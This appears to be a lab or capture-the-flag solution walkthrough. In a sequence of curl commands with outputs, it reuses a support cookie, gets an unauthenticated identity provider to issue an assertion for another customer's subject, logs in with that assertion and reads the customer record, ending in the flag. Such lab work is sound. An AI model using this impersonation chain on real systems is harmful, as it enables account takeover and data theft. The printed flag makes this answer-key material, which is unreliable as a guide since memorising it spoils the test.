## Prerequisites: K18.3 (provider registered), K17.1 (support cookie)

`support_cookie=fk_support_rowan_<token-from-credentials>`

(The support cookie comes from the runtime credentials or from completing K17.1.)

## Get support session to find customer tenant and history dossier

```
curl -sS --cacert ~/.local/share/keplerops/ca.crt \
  -H "Cookie: fieldkest_support=$support_cookie" \
  https://support.keplerops.test/api/session
```

Output: `{"customer":{"tenant":"TEN-ARWC-047","history_dossier":"DOS-ARWC-HIST-01"},...}`

## Get history dossier for federation details

```
curl -sS --cacert ~/.local/share/keplerops/ca.crt \
  -H "Cookie: fieldkest_support=$support_cookie" \
  https://support.keplerops.test/api/customers/TEN-ARWC-047/dossiers/DOS-ARWC-HIST-01
```

Output: `{"reviewer_federation":{"provider":"OIDC-FIELDKEST-RETAINED-SUPPORT","tenant":"TEN-ARWC-047","subject":"urn:fieldkest:pairwise:7c0e4f2a-2e62-4d80-a279-1fdb4f02b6c7"},"customer_record":"CUSTREC-047-R6",...}`

Values used next: `tenant=TEN-ARWC-047`, `subject=urn:fieldkest:pairwise:7c0e4f2a-2e62-4d80-a279-1fdb4f02b6c7`, `customer_record=CUSTREC-047-R6`

## Get the correct audience from federation metadata

```
curl -sS --cacert ~/.local/share/keplerops/ca.crt \
  https://support.keplerops.test/federation/retained-support/.well-known/openid-configuration
```

Output: `{"assertion_audiences_supported":["fieldkest-support"],...}`

Audience: `fieldkest-support`

## Get assertion from retained-support provider

```
curl -sS --cacert ~/.local/share/keplerops/ca.crt -X POST \
  -H "Content-Type: application/json" \
  --data-binary '{"audience":"fieldkest-support","subject":"urn:fieldkest:pairwise:7c0e4f2a-2e62-4d80-a279-1fdb4f02b6c7","tenant":"TEN-ARWC-047"}' \
  https://support.keplerops.test/federation/retained-support/assertions
```

Output: `{"assertion":"<jwt_token>"}`

## Login via federation (get federated session cookie)

```
curl -sS --cacert ~/.local/share/keplerops/ca.crt -X POST \
  -H "Content-Type: application/json" \
  --data-binary '{"assertion":"<jwt_token>"}' \
  https://identity.keplerops.test/api/federation/login
```

Output: `{"session_cookie":"fieldkest_federated=<uuid>"}`

## Read customer record via federated session (K18.4 acceptance check)

```
curl -sS --cacert ~/.local/share/keplerops/ca.crt \
  -H "Cookie: fieldkest_federated=<uuid>" \
  https://support.keplerops.test/api/customers/TEN-ARWC-047/dossiers/CUSTREC-047-R6
```

Output: `{"flag":"FLAG{b6cd284e8b911de5}","federated_subject":"urn:fieldkest:pairwise:7c0e4f2a-2e62-4d80-a279-1fdb4f02b6c7","record_id":"CUSTREC-047-R6","tenant":"TEN-ARWC-047",...}`
